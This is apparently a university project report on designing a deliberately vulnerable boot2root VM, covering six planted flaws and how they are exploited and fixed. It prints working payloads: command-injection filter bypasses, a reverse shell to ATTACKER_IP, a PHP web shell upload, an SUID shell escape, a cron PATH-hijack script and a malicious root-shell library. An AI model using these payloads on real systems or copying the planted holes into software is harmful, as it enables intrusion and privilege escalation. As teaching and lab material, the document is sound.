# Boot2Root VM Design: Waifu Gallery – Artificial Vulnerability Orchestration

## Academic Project: Design and Implementation of a Controlled Vulnerable Environment

**Project Context:**
- **University:** Sapienza University of Rome, Cybersecurity Department
- **Course:** Ethical Hacking & Penetration Testing (A.Y. 2023/24)
- **Role:** Lead Architect & Full-Stack Developer (6 vulnerabilities, 3 difficulty levels)
- **Target:** Design of a vulnerable virtual machine intended for educational simulations in an exam environment
- **Deliverable:** Working Linux VM + Official technical report + Source code

**Why this project is relevant to cybersecurity:**
Students weren't just supposed to find vulnerabilities: they had to understand how to chain them together, following the footprint → access → privilege escalation path.

**Technologies & Stack:**
- **Operating System:** Ubuntu 20.04.6 LTS
- **Web Stack:** Apache2 + PHP
- **Backend Logic:** Bash scripting, C (exploit compilation)
- **Implemented Vulnerabilities:** 6 distinct (3 Access Vectors, 3 Privilege Escalations), Easy/Medium/Hard levels
- **Infrastructure:** Git versioning for tracking design decisions

---

## 1. System Concept & Architecture

### 1.1 How We Thought It Out

We decided not to make the usual boring "Linux VM with 6 hidden flags". We wanted something that:

1. **Was realistic** – A web gallery is something students have actually seen online, not an abstract environment
2. **Had a storyline** – The anime theme wasn't random: the professor loves anime, so it came naturally. But importantly: the hints are in the UI (tooltips on images), so finding them requires OSINT on the site, not reading the codebase
3. **Was progressive** – Easy vulnerabilities to understand the flow, Medium to learn bypasses that actually work, Hard for those who really grasped the concepts

**The Choice: Waifu Gallery**
A mid-2000s anime character gallery. Why? Because it's believable (they existed back then), it's a web service that was actually a thing, and students already knew what we were talking about. You don't have to explain "what a gallery is", you already know it's a site where you scroll through images.

### 1.2 Architecture: Where We Put What

Every vulnerability had to be in a specific place on the system. This way the attacker had to move sequentially:

| Component | What It Is | Where To Attack |
|---|---|---|
| **Frontend** | PHP gallery with search bar | Web Command Injection (search bar) |
| **Hidden upload** | imposter.php (unlinked) | File Upload double extension bypass |
| **Backend Filters** | Command blacklist + regex | Bypassable with `;;` and `##` |
| **System User** | `amogus` with password `sus1` | SSH brute-force (name discoverable via UI hint) |
| **hping3 SUID** | Binary with active SUID bit | Instant root shell |
| **Cronjob** | Writable script, executed as root | PATH hijacking |
| **ld.so config** | Library in writable path | Library hijacking + custom assembly |

**Designed Progression:**
- **Easy:** Discover the user from the UI => SSH brute-force => find SUID hping3
- **Medium:** Bypass the web search filter => discover the cronjob, modify it and wait for the root rev shell
- **Hard:** Find imposter.php and bust the upload filter => create the malicious C library, swap it, hijack ld.so

---

## 2. Vulnerability Landscape & Exploitation Chains

### 2.1 Vulnerability Summary Matrix

| #  | Vulnerability Name | Category | Difficulty | Prerequisites | Post-Exploitation |
|----|----|---|---|---|---|
| **3.1** | Weak SSH Credentials | Initial Access | ⭐ EASY | None (public brute-force) | `amogus` user shell |
| **3.2** | Web Command Injection | Lateral Escalation | ⭐⭐ MEDIUM | Web app access (default) | RCE as www-data user |
| **3.3** | File Upload + Shell Execution | RCE | ⭐⭐⭐ HARD | Uncover hidden page + upload bypass + execution | www-data shell + persistent backdoor |
| **4.1** | SUID Binary Exploitation (hping3) | Privilege Escalation | ⭐ EASY | Non-root user shell | Instant root shell |
| **4.2** | Insecure Cronjob PATH | Privilege Escalation | ⭐⭐ MEDIUM | User access + wait timing | Root shell (from reverse shell) |
| **4.3** | LD_LIBRARY_PATH Hijacking | Privilege Escalation | ⭐⭐⭐ HARD | SUID binary + writable library path + C compilation skills | Root shell |

### 2.2 Attack Chain Visualization

```
┌─────────────────────────────────────────────────────────┐
│ INITIAL ACCESS                                          │
│ ├─ [3.1] SSH brute-force (amogus:sus1)      ← Easiest   │
│ └─ [3.1] HTTP Reconnaissance → UI hints                 │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ LATERAL MOVEMENT / WEB RCE                              │
│ ├─ [3.2] Command Injection via search bar  ← Via ;;##   │
│ │         shell_exec() bypass                           │
│ └─ [3.3] Hidden upload page (imposter.php)              │
│          shell.php.jpg double extension bypass          │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ PRIVILEGE ESCALATION (Choose One)                       │
│ ├─ [4.1] SUID hping3 → /bin/sh -p         ← Simplest    │
│ ├─ [4.2] Cronjob PATH manipulation                      │
│ └─ [4.3] LD_LIBRARY_PATH hijacking        ← Complex     │
└─────────────────────────────────────────────────────────┘
```

**Educational Key:**
Each level demonstrates real-world concepts found in professional engagements:
- **Easy:** Basic reconnaissance + weak credentials (e.g., Spring4Shell, ProxyLogon preliminary phases)
- **Medium:** Insufficient sanitization + misunderstanding of shell metacharacters
- **Hard:** Deep understanding of ELF loaders + exploitation of complex privilege boundaries

---

## 3. Access Vulnerabilities (Custom Implementation)

This section describes the entry vectors designed and implemented to allow the attacker to gain initial access to the system.

### 3.1 Weak SSH Credentials – Easy Mode

#### Setup
The user `amogus` with password `sus1` is the first clue. The name is a reference to Among Us (the game), which was popular in our study groups at the time. We knew the other students would recognize it.

The password isn't in the UI anywhere, but the username is: if you open DevTools and inspect any image in the gallery, you see:
```html
<img src="..." title="amogus" ...>
```

So to solve this vulnerability you need to:
1. Observe the UI (open browser inspector)
2. Identify the hidden title
3. Attempt SSH brute-force with that username

#### The Exploit
```bash
# Reconnaissance: hover over an image, see the tooltip
# Or F12 → Inspector, look for title attribute

# SSH Brute-force
hydra -l amogus -P wordlist.txt ssh://<vm_ip>
# Or: ssh amogus@<vm_ip> with password "sus1"
```

It's Easy because there's no hidden logic: the name is visible in the UI, the password is trivial. The only effort is understanding you need to hit SSH, not the web app.

### 3.2 Web Command Injection – Medium Mode

#### The Vulnerability
The search bar performs an image search using `shell_exec("ls $image_folder$query*.jpg")`. The filter was blacklist-based: it blocks bash, nc, wget, and specific commands. However, we intentionally left a hole.

If you use `;` or `#` directly, it gets blocked. BUT if you use `;;` and `##`, the filter recognizes them as "doubles" and allows them. Then there's an `str_replace()` that converts them back to singles:
```php
if (strpos($query, ";;") !== false && strpos($query, "##") !== false) {
    $query = str_replace(";;", ";", $query);    // ;; -> ;
    $query = str_replace("##", "#", $query);    // ## -> #
}
```

The problem: the check happens BEFORE the replacement. So `;;ls /##` bypasses the filter because `;;` is not `;`, so it doesn't get blocked.

#### How to Solve It
```bash
# Direct payloads
;;ls /##            # Lists root directory
;;cat /etc/passwd##  # Reads sensitive files
;;whoami##          # See who you are

# More complex payloads (reverse shell):
;;bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1##
```

**Defense:**
Do not use `shell_exec` with user input. Or if you must:
1. **Whitelist** – only accept safe characters: `preg_replace('/[^a-zA-Z0-9_-]/', '', $query)`
2. **escapeshellarg()** – if you absolutely must use shell_exec: `escapeshellarg($query)`
3. **Better: native PHP** – `glob("images/{$query}*.jpg")` without using the shell

### 3.3 File Upload Bypass – Hard Mode

#### The Idea
We created a hidden page `imposter.php` that isn't linked anywhere. If you find it and access it, you can upload a file.

The filter only checks the final extension using `pathinfo()`. Therefore:
- `shell.php.jpg` → extension = `.jpg` ✅ bypasses the filter
- But the file gets saved as `shell.php.jpg` and if Apache executes it as PHP → RCE

#### How to Find It
```bash
# 1. Brute force
gobuster dir -u http://<vm_ip> -w /usr/share/wordlists/common.txt
# Discover imposter.php

# 2. Or if you have RCE from command injection:
cat index.php | grep -i "upload\|form\|POST"  # Find links to imposter.php
```

#### The Exploit
```bash
# Create a web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Rename with double extension
mv shell.php shell.php.jpg

# Upload
curl -F "image=@shell.php.jpg" http://<vm_ip>/imposter.php

# Execute
curl "http://<vm_ip>/images/shell.php.jpg?cmd=id"
# uid=33(www-data) ...
```

#### Defense
1. **Check magic bytes** – Not extension. `getimagesize()` verifies if it's genuinely an image
2. **Rename the file** - Generate a random name: `bin2hex(random_bytes(16)) . ".jpg"`
3. **Store outside webroot** - Save it in `/var/uploads/`, not where Apache can execute it
4. **Disable PHP execution** in the upload folder (.htaccess or web.config)

## 4. Privilege Escalation – How to Become Root

### 4.1 SUID hping3 – Easy

#### What is hping3?
`hping3` is a packet crafting tool, similar to `ping` but on steroids. It's used to test firewalls, create custom packets, stuff like that. It should NEVER have SUID.

#### The Exploit
```bash
# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null | grep hping
# Output: /usr/sbin/hping3

# Execute hping3 (which is SUID root)
$ /usr/sbin/hping3
hping3 > /bin/sh -p

# Boom, you're root
$ whoami
root
```

The `-p` flag in `/bin/sh` is critical: "preserve mode". Without it, the shell drops privileges automatically.

#### Why it works
`hping3` with SUID executes as root. Inside hping3 there is a shell escape feature. You ask for a shell, and the process (which is root) gives it to you. Easy.

#### Defense
```bash
# Remove SUID
chmod -s /usr/sbin/hping3

# Or use sudo with logging:
# sudoers: amogus ALL=(root) NOPASSWD: /usr/sbin/hping3
```

### 4.2 Cronjob PATH Hijacking – Medium

#### How It Works
A Cronjob (cron) is a Linux scheduler that runs scripts periodically. If:
- The script is executed **as root** but is **writable by non-root**
- And it uses **relative paths** to execute commands

Then we can hijack the executables by adding a fake directory to the PATH where we create our own executables with the same name. When cron runs the command, it finds our fake one.

#### Vulnerability Discovery Phase

**Step 1: Identify the "overwrite.sh" script**
```bash
find / -name "overwrite.sh" -type f -writable 2>/dev/null
# Output: /home/developer/overwrite.sh
# Permissions: -rw-rw-r-- (writable by non-root!)
```

**Step 2: Examine the script content**
```bash
cat /home/developer/overwrite.sh
# Output uses RELATIVE paths:
# ls /          (instead of: /bin/ls /)
# whoami        (instead of: /usr/bin/whoami)
# id            (instead of: /usr/bin/id)
```

#### The Vulnerability: Relative vs Absolute Paths

**How PATH hijacking works:**
When cron executes the script with PATH like `/home/developer:/usr/bin:/bin`:
```
When script executes: ls
System searches:
1. /home/developer/ls        ← Attacker CREATES THIS
2. /usr/bin/ls
3. /bin/ls

Result: Attacker's malicious /home/developer/ls executes as root!
```

#### Exploitation Chain

**Step 1: Create malicious executable**
```bash
cat > /home/developer/ls << 'EOF'
#!/bin/bash
# This will execute as ROOT because cron runs as root!
bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1
EOF
chmod +x /home/developer/ls
```

**Step 2: Set up listener**
```bash
nc -lnvp 7777
# Waiting for reverse shell...
```

**Step 3: Wait for cron execution**
```bash
# Cron will execute overwrite.sh at scheduled time (e.g., every minute)
# When it runs "ls /" inside the script:
# It looks for "ls" in PATH
# Finds /home/developer/ls
# Executes OUR malicious script as root
```

**Step 4: Get root shell**
```bash
root@vm:/# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Remediation (Multi-Layered)

**Layer 1: Use absolute paths in scripts (PRIMARY)**
```bash
#!/bin/bash
# SECURE: All paths are absolute
/bin/ls /
/usr/bin/whoami
/usr/bin/id
/bin/cat /etc/passwd
```

**Layer 2: Set restrictive PATH in cronjob**
```cron
# In /etc/cron.d/example:
PATH=/bin:/usr/bin
SHELL=/bin/bash
* * * * * root /home/developer/overwrite.sh > /dev/null 2>&1
```

**Layer 3: Make scripts non-writable by non-root**
```bash
chmod 750 /home/developer/overwrite.sh
# Now only owner (root) and group can modify
``` 

### 4.3 LD.SO Hijacking – Hard

#### How The ELF Loader Works
The ELF loader (`ld.so`) resolves the dynamic libraries that a program needs at runtime. It follows a specific search order:

```
1. LD_LIBRARY_PATH (environment variable)
2. /etc/ld.so.cache (compiled cache)
3. /etc/ld.so.conf and /etc/ld.so.conf.d/ (system configs)
4. Standard dirs: /lib, /usr/lib, /lib64, /usr/lib64
```

If a SUID binary searches for a library in a **writable** directory, we can place our malware version there and the SUID binary will load it.

#### Discovery: Finding the Vulnerable Binary

**Step 1: Check for non-standard library paths**
```bash
# Check /etc/ld.so.conf.d/ for unusual paths:
ls -la /etc/ld.so.conf.d/
cat /etc/ld.so.conf.d/* | grep -v "^#"
# Output might include: /home/developer/libs

# Verify if path is writable by non-root:
ls -la /home/developer/libs
# Output: drwxrwxr-x 1 root www-data (www-data can write here!)
```

**Step 2: Find SUID binary with missing library**
```bash
find / -perm -4000 -type f 2>/dev/null

# For each binary, check what libraries it needs:
ldd /usr/sbin/testingapp
# Output example:
#   libcustomapp.so => not found              ← MISSING LIBRARY!
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

#### The Exploit: Creating Malicious Library

**Step 1: Create malicious libcustomapp.so**
```c
// malicious_libcustomapp.c
#include <unistd.h>
void functionLoader() {
    setuid(0);      // Set UID to root
    setgid(0);      // Set GID to root
    system("/bin/sh");  // Spawn shell as root
}
```

**Step 2: Compile the malicious library**
```bash
gcc -shared -fPIC -o libcustomapp.so malicious_libcustomapp.c

# Verify it was created:
file libcustomapp.so
```

**Step 3: Place library in the vulnerable directory**
```bash
cp libcustomapp.so /home/developer/libs/

# Verify placement:
ls -la /home/developer/libs/libcustomapp.so
```

**Step 4: Execute the vulnerable binary**
```bash
/usr/sbin/testingapp

# What happens:
# 1. testingapp starts (SUID means it runs as root)
# 2. ELF loader searches for libcustomapp.so
# 3. Finds our malicious /home/developer/libs/libcustomapp.so FIRST
# 4. Loads OUR library which calls setuid(0) + system("/bin/sh")
# 5. Shell prompt appears as root!

# Result:
# # whoami
# root
```

#### Remediation (Hardening)

**Layer 1: Use absolute paths + remove unsafe entries**
```bash
# Remove or comment out:
cat /etc/ld.so.conf.d/custom.conf
# /home/developer/libs   ← REMOVE THIS

# Rebuild the loader cache:
sudo ldconfig
```

**Layer 2: Remove SUID bit**
```bash
chmod -s /usr/sbin/testingapp
```

**Layer 3: Make library directories read-only**
```bash
chmod 555 /home/developer/libs
```

**Layer 4: Force RPATH (static library path)**
```bash
# When compiling, use -Wl,-rpath:
gcc -o testingapp testingapp.c -lcustomapp -Wl,-rpath=/usr/local/lib/secure
# Binary looks ONLY in /usr/local/lib/secure
# Ignores LD_LIBRARY_PATH and /etc/ld.so.conf.d/
```

## 5. How To Fix It – Defense Strategies

### 5.1 Fix Priorities

| Vulnerability | Severity | Primary Remediation | Impl. Time | Effort | Testing |
|---|---|---|---|---|---|
| 3.1 (Weak SSH) | CRITICAL | SSH key-based + strong policy | 2 hrs | LOW | `ssh-keygen -t ed25519` |
| 3.2 (Cmd Inject) | CRITICAL | Sanitize input + use whitelist | 4 hrs | MEDIUM | `escapeshellarg()` test |
| 3.3 (Upload RCE) | CRITICAL | Magic bytes + disable PHP in upload dir | 3 hrs | MEDIUM | File upload test |
| 4.1 (SUID hping3) | HIGH | Remove SUID bit | 15 min | LOW | `find / -perm -4000` |
| 4.2 (Cronjob) | HIGH | Absolute paths + restrictive PATH | 1 hr | MEDIUM | Monitor cron execution |
| 4.3 (ld.so) | HIGH | Remove unsafe ld.so.conf.d entries | 30 min | LOW | Verify ld.so.conf.d |

### 5.2 The Defense Strategy

**To Do Immediately (Fixing Web Vulnerabilities):**
1. Do not use dangerous functions like `shell_exec()` without sanitizing
2. If absolutely necessary, strictly whitelist safe characters (letters, numbers, wildcard `*`)
3. Upload files: check magic bytes, not just the extension
4. Disable PHP execution in `/images/` using `.htaccess` (Apache) or nginx config

**Next (Eliminate Privilege Escalations):**
5. Remove SUID from unnecessary binaries
6. SSH: enforce key-based auth only, disable password logins
7. Cronjobs: always use absolute paths, never relative
8. LD.SO: audit `/etc/ld.so.conf.d/`, remove user-writable paths
9. Monthly check for SUID binaries using `find / -perm -4000`

**Ongoing (Monitoring):**
10. Periodically scan web inputs
11. Audit file permissions (monthly)
12. Log analysis for unauthorized access attempts